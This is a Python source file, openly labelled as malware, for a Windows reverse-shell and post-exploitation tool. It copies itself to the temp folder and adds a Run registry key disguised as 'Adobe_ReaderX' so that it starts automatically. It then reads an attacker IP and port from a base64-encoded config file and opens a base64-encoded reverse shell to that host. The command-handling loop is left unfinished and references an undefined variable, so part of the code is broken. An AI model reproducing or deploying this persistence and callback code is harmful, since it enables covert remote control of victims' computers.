"""
    @Malware
    ST2Labs / GEO SYSTEM SOFTWARE
 
    Python Reverse Shell / Post-Explotation
 
    This code is base on:
        http://www.primalsecurity.net/
        Post: /0xc-python-tutorial-python-malware
"""
import sys
import base64
import os
import socket
from _winreg import *
 
 
def autorun(tempdir, fileName, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s' % (fileName, tempdir))
 
    # Queries Windows registry for the autorun key value
    # Stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey = []
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            #print subkey[0]
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
 
    # If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX', 0, REG_SZ, r"%TEMP%\rsh.exe")
            key.Close()
        except WindowsError:
            pass
 
 
# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str
 
 
# Encode Base64 data
def encode(data):
    return base64.b64encode(data)
 
 
# Get JSON Configuration from file code with Base64
def getconfig(name):
    import json
    with open(name, 'rb') as f:
        d = json.loads(decode(f.read()))
        return d
 
 
def shell(ip, port):
    #Base64 encoded reverse shell
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        msg = '[*] Connection Established!'
        s.send(encode(msg))
        while 1:
            cmd = decode(s.recv(1024))
            if cmd == "quit":
                break
            # Here is where must implement action stuff
            # response is result to exceute action
            encoded = encode(response)
            s.send(encoded)
    except socket.error:
        sys.exit(2)
    except WindowsError:
        pass
    finally:
        s.close()
 
 
def main():
    try:
        tempdir = '%TEMP%'
        fileName = sys.argv[0]
        run = "Software\Microsoft\Windows\CurrentVersion\Run"
        autorun(tempdir, fileName, run)
        conf = getconfig('conf.ini')
        shell(conf['ip'], conf['port'])
    except KeyboardInterrupt:
        sys.exit(2)
 
if __name__ == "__main__":
        main()
